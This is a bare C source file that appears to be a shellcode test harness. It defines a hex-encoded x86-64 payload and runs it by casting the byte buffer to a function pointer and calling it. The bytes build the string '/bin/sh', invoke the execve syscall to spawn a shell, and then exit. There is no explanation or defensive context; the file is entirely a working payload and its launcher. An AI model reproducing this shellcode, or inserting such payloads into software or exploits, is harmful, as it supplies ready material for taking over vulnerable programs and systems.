#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x48\x31\xc0\x99\x49\xb9\xff\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe9\x08\x4c\x89\x4c\x24\xf8\x48\x8d\x7c\x24\xf8\x04\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05";

main() {

	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;

	ret();

}


